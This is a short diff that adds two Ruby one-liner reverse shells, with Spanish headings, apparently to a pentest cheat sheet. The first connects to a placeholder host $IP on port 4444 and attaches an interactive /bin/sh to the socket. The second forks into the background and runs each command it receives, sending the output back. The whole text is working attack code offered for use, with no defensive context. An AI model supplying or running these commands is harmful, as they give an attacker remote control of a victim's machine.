@@ -1,0 +1,5 @@
+▶ Reverse Shell en una Línea (Shell básica con TCPSocket):
+  ruby -rsocket -e'f=TCPSocket.open("$IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+▶ Reverse Shell con Sistema Operativo (Ejecutar comandos dinámicos):
+  ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
